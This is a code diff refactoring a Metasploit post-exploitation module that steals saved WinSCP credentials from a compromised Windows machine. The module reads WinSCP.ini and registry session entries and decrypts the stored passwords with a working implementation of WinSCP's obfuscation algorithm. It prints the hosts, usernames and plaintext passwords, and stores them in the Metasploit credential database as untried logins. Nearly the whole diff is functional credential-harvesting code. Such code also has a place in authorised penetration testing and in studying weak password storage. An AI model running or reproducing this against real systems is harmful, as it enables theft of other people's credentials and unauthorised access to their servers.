@@ -14,6 +14,7 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
+  include Msf::Post::File
 
   def initialize(info={})
     super(update_info(info,
@@ -72,34 +73,12 @@ class Metasploit3 < Msf::Post
             portnum = 22
           end
 
-          user = registry_getvaldata(active_session, 'UserName') || ""
-          host = registry_getvaldata(active_session, 'HostName') || ""
-          proto = registry_getvaldata(active_session, 'FSProtocol') || ""
-
-          # If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0
-          # it is set to SCP.
-          if proto == nil or proto == 0
-            proto = "SSH"
-          else
-            proto = "FTP"
-          end
-
-          #Decrypt our password, and report on results
-          pass= decrypt_password(password, user+host)
-          print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
-          if session.db_record
-            source_id = session.db_record.id
-          else
-            source_id = nil
-          end
-          report_auth_info(
-            :host  => host,
-            :port => portnum,
-            :sname => proto,
-            :source_id => source_id,
-            :source_type => "exploit",
-            :user => user,
-            :pass => pass
+          winscp_store_config(
+            'FSProtocol' => registry_getvaldata(active_session, 'FSProtocol') || "",
+            'HostName' => registry_getvaldata(active_session, 'HostName') || "",
+            'Password' => password,
+            'PortNumber' => portnum,
+            'UserName' => registry_getvaldata(active_session, 'UserName') || "",
           )
 
         end
@@ -119,65 +98,35 @@ class Metasploit3 < Msf::Post
 
 
   def get_ini(filename)
-    begin
-      #opens the WinSCP.ini file for reading and loads it into the MSF Ini Parser
-      client.fs.file.stat(filename)
-      config = client.fs.file.new(filename,'r')
-      parse = config.read
-      print_status("Found WinSCP.ini file...")
-      ini=Rex::Parser::Ini.from_s(parse)
+    print_error("Looking for #{filename}.")
+    # opens the WinSCP.ini file for reading and loads it into the MSF Ini Parser
+    parse = read_file(filename)
+    if parse.nil?
+      print_error("WinSCP.ini file NOT found...")
+      return
+    end
 
-      #if a Master Password is in use we give up
-      if ini['Configuration\\Security']['MasterPassword'] == '1'
-        print_status("Master Password Set, unable to recover saved passwords!")
-        return nil
+    print_status("Found WinSCP.ini file...")
+    ini = Rex::Parser::Ini.from_s(parse)
+
+    # if a Master Password is in use we give up
+    if ini['Configuration\\Security']['MasterPassword'] == '1'
+      print_status("Master Password Set, unable to recover saved passwords!")
+      return nil
+    end
+
+    # Runs through each group in the ini file looking for all of the Sessions
+    ini.each_key do |group|
+      if group.include?('Sessions') && ini[group].has_key?('Password')
+        winscp_store_config(
+          'FSProtocol' => ini[group]['FSProtocol'],
+          'HostName' => ini[group]['HostName'],
+          'Password' => ini[group]['Password'],
+          'PortNumber' => ini[group]['PortNumber'] || 22,
+          'UserName' => ini[group]['UserName'],
+        )
+
       end
-
-      #Runs through each group in the ini file looking for all of the Sessions
-      ini.each_key do |group|
-        groupkey='Sessions'
-        if group=~/#{groupkey}/
-          #See if we have a password saved in this sessions
-          if ini[group].has_key?('Password')
-            # If no explicit port number is defined, then it is the default tcp 22
-            if ini[group].has_key?('PortNumber')
-              portnum = ini[group]['PortNumber']
-            else
-              portnum = 22
-            end
-            host= ini[group]['HostName']
-            user= ini[group]['UserName']
-            proto = ini[group]['FSProtocol']
-
-            # If no explicit protocol entry exists it is on sFTP with SCP backup. If it
-            # is 0 it is set to SCP.
-            if proto == nil or proto == 0
-              proto = "SSH"
-            else
-              proto = "FTP"
-            end
-            # Decrypt the password and report on all of the results
-            pass= decrypt_password(ini[group]['Password'], user+host)
-            print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
-            if session.db_record
-              source_id = session.db_record.id
-            else
-              source_id = nil
-            end
-            report_auth_info(
-              :host  => host,
-              :port => portnum,
-              :sname => proto,
-              :source_id => source_id,
-              :source_type => "exploit",
-              :user => user,
-              :pass => pass
-            )
-          end
-        end
-      end
-    rescue
-      print_status("WinSCP.ini file NOT found...")
     end
   end
 
@@ -186,12 +135,12 @@ class Metasploit3 < Msf::Post
     pwalg_simple_magic = 0xA3
     pwalg_simple_string = "0123456789ABCDEF"
 
-    # Decrypts the next charachter in the password sequence
+    # Decrypts the next character in the password sequence
     if @password.length > 0
       # Takes the first char from the encrypted password and finds its position in the
       # pre-defined string, then left shifts the returned index by 4 bits
       unpack1 = pwalg_simple_string.index(@password[0,1])
-      unpack1= unpack1 << 4
+      unpack1 = unpack1 << 4
 
       # Takes the second char from the encrypted password and finds its position in the
       # pre-defined string
@@ -213,37 +162,76 @@ class Metasploit3 < Msf::Post
     flag = decrypt_next_char()
 
     if flag == pwalg_simple_flag
-      decrypt_next_char();
-      length = decrypt_next_char();
+      decrypt_next_char()
+      length = decrypt_next_char()
     else
-      length = flag;
+      length = flag
     end
-    ldel = (decrypt_next_char())*2 ;
-    @password = @password[ldel,@password.length];
-    result="";
-    for ss in 0...length
-      result+=decrypt_next_char().chr
+    ldel = (decrypt_next_char())*2
+    @password = @password[ldel,@password.length]
+
+    result = ""
+    length.times do
+      result << decrypt_next_char().chr
     end
 
     if flag == pwalg_simple_flag
-      result= result[key.length,result.length];
-
+      result = result[key.length, result.length]
     end
 
-    return result
-
-
+    result
   end
 
   def run
     print_status("Looking for WinSCP.ini file storage...")
-    get_ini(client.fs.file.expand_path("%PROGRAMFILES%\\WinSCP\\WinSCP.ini"))
+    get_ini(expand_path("%PROGRAMFILES%\\WinSCP\\WinSCP.ini"))
     print_status("Looking for Registry Storage...")
     get_reg()
     print_status("Done!")
-
   end
 
+  def winscp_store_config(config)
+    host = config['HostName']
+    pass = config['Password']
+    portnum = config['PortNumber']
+    proto = config['FSProtocol']
+    user = config['UserName']
 
+    sname = case proto.to_i
+            when 5 then "FTP"
+            when 0 then "SSH"
+            end
+
+    # Decrypt our password, and report on results
+    plaintext = decrypt_password(pass, user+host)
+    print_status("Host: #{host}  Port: #{portnum} Protocol: #{sname}  Username: #{user}  Password: #{plaintext}")
+
+    service_data = {
+      # XXX This resolution should happen on the victim side instead
+      address: ::Rex::Socket.getaddress(host),
+      port: portnum,
+      service_name: sname,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+    }
+
+    credential_data = {
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: self.refname,
+      private_type: :password,
+      private_data: plaintext,
+      username: user
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
 
 end
